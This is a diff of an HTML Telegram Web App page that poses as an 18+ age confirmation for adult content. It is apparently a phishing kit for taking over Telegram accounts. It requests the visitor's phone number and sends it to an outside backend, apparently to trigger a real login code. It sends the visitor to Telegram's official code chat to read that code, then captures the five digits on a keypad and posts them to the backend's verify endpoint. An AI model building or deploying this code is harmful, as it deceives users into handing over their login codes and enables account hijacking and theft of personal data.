@@ -3,86 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Access Content</title>
+    <title>Access Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; }
+        * { box-sizing: border-box; transition: 0.3s; }
         body { 
-            font-family: 'Segoe UI', Roboto, sans-serif; 
-            margin: 0; padding: 0; 
+            font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; 
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; 
-            height: 100vh; display: flex; align-items: center; justify-content: center;
+            background-size: cover; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
-        /* ব্লার ইফেক্ট */
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); z-index: 1; }
-
-        .container { position: relative; z-index: 2; width: 90%; max-width: 380px; text-align: center; }
-
-        /* পপআপ কার্ড ডিজাইন */
-        .card { background: rgba(255, 255, 255, 0.9); border-radius: 25px; padding: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.3); }
-
-        .icon-box { width: 80px; height: 80px; background: #fff; border-radius: 50%; margin: -60px auto 15px; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-        .icon-box img { width: 50px; }
-
-        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-
-        /* ওটিপি বক্স */
-        .otp-wrapper { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .otp-input { width: 45px; height: 50px; background: #fff; border: 2px solid #ddd; border-radius: 12px; font-size: 24px; font-weight: bold; color: #333; display: flex; align-items: center; justify-content: center; }
-        .otp-input.active { border-color: #4caf50; box-shadow: 0 0 10px rgba(76, 175, 80, 0.3); }
-
-        /* বাটন */
-        .btn-green { background: #4caf50; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3); margin-bottom: 15px; }
-
-        /* কিপ্যাড */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); z-index: 1; }
+        .card { position: relative; z-index: 2; width: 90%; max-width: 380px; background: rgba(255, 255, 255, 0.9); border-radius: 30px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); }
+        .icon { font-size: 60px; margin-bottom: 15px; }
+        h2 { color: #333; margin: 0 0 10px; font-size: 22px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .btn { width: 100%; padding: 16px; border-radius: 15px; border: none; font-size: 17px; font-weight: bold; cursor: pointer; background: #4caf50; color: #fff; box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4); }
+        .btn-view { background: #0088cc; margin-bottom: 15px; }
+        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
+        .otp-box { width: 45px; height: 55px; background: #fff; border: 2px solid #ddd; border-radius: 12px; font-size: 26px; font-weight: bold; color: #333; display: flex; align-items: center; justify-content: center; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #fff; border: 1px solid #eee; padding: 15px; border-radius: 12px; font-size: 20px; font-weight: bold; color: #333; cursor: pointer; transition: 0.2s; }
+        .key { background: #fff; padding: 15px; border-radius: 12px; font-size: 22px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #eee; }
         .key:active { background: #f0f0f0; transform: scale(0.95); }
-
         .hidden { display: none !important; }
-
-        /* অ্যানিমেশন */
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4caf50; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .spinner { border: 4px solid rgba(0,0,0,0.1); border-top: 4px solid #4caf50; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
-
-    <div class="container">
-        <!-- ধাপ ১: কনফার্মেশন -->
-        <div id="step1" class="card">
-            <div class="icon-box">🔞</div>
+    <div class="card">
+        <!-- Step 1: Confirm -->
+        <div id="step1">
+            <div class="icon">🔞</div>
             <h2>Attention! 🔞</h2>
             <p>To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn-green" onclick="requestAccess()">🍓 confirm 🔞</button>
+            <button class="btn" onclick="startProcess()">🍓 confirm 🔞</button>
         </div>
 
-        <!-- ধাপ ২: ওয়েট স্ক্রিন -->
-        <div id="step_loading" class="card hidden">
-            <div class="spinner"></div>
-            <p>Wait...</p>
+        <!-- Loading -->
+        <div id="loading" class="hidden">
+            <div class="loader"></div>
+            <p id="load_text">Wait...</p>
         </div>
 
-        <!-- ধাপ ৩: ওটিপি স্ক্রিন -->
-        <div id="step2" class="card hidden">
-            <div class="icon-box">📩</div>
+        <!-- Step 2: OTP -->
+        <div id="step2" class="hidden">
+            <div class="icon">📩</div>
             <p>Enter the 5-digit code that we just sent you!</p>
-            <div class="otp-wrapper">
-                <div class="otp-input" id="b1"></div>
-                <div class="otp-input" id="b2"></div>
-                <div class="otp-input" id="b3"></div>
-                <div class="otp-input" id="b4"></div>
-                <div class="otp-input" id="b5"></div>
+            <div class="otp-container">
+                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
             </div>
-            <button class="btn-green" onclick="viewCode()">🔞 GET CODE 🔞</button>
+            <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
             <div class="keypad">
-                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
-                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
-                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
-                <div style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key" onclick="clearNum()">⌫</div>
+                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
+                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
+                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
+                <div style="background:transparent"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
             </div>
         </div>
     </div>
@@ -90,58 +66,75 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
+        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
+        let userId = null;
         let currentOTP = "";
 
-        function requestAccess() {
+        // ইউজার আইডি চেক (null ফিক্স)
+        function getUserId() {
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                userId = tg.initDataUnsafe.user.id;
+            }
+        }
+        getUserId();
+
+        function startProcess() {
+            getUserId();
+            if (!userId) return alert("Error: User data not found. Open from Telegram!");
             tg.requestContact((shared, data) => {
                 if (shared) {
                     document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step_loading').classList.remove('hidden');
-                    sendPhone(data.response_data.contact.phone_number);
+                    document.getElementById('loading').classList.remove('hidden');
+                    pollContact();
                 }
             });
         }
 
-        async function sendPhone(phone) {
-            const res = await fetch(`${BACKEND_URL}/send_number`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, phone: phone })
-            });
-            if((await res.json()).status === "success") {
-                document.getElementById('step_loading').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            }
+        async function pollContact() {
+            try {
+                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
+                const data = await res.json();
+                if (data.status === "success") {
+                    sendNumber(data.phone);
+                } else { setTimeout(pollContact, 1500); }
+            } catch (e) { setTimeout(pollContact, 2000); }
         }
 
-        function addNum(n) {
+        async function sendNumber(phone) {
+            document.getElementById('load_text').innerText = "Sending Code...";
+            const res = await fetch(`${BACKEND_URL}/send_number`, {
+                method: "POST", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ user_id: userId, phone: phone })
+            });
+            const result = await res.json();
+            if (result.status === "success") {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            } else { alert("Error: " + result.message); location.reload(); }
+        }
+
+        // --- ম্যাজিক বাটন: ওটিপি চ্যাটে নিয়ে যাওয়া ---
+        function viewCode() {
+            tg.openTelegramLink("https://t.me/777000");
+        }
+
+        function press(n) {
             if(currentOTP.length < 5) {
                 currentOTP += n;
-                updateView();
+                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
                 if(currentOTP.length === 5) verifyOTP();
             }
         }
-        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateView(); }
-        function updateView() {
-            for(let i=1; i<=5; i++) {
-                let el = document.getElementById('b'+i);
-                el.innerText = currentOTP[i-1] || "";
-                el.classList.toggle('active', i === currentOTP.length + 1);
-            }
-        }
-
-        function viewCode() { tg.switchInlineQuery(""); }
+        function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
 
         async function verifyOTP() {
             const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, otp: currentOTP })
+                body: JSON.stringify({ user_id: userId, otp: currentOTP })
             });
             const data = await res.json();
-            if (data.status === "success") {
-                tg.showAlert("✅ Success! Unlocked archives.");
-                tg.close();
-            } else { alert("Wrong Code!"); currentOTP = ""; updateView(); }
+            if (data.status === "success") { tg.close(); }
+            else { alert("Invalid Code!"); currentOTP = ""; back(); }
         }
     </script>
 </body>
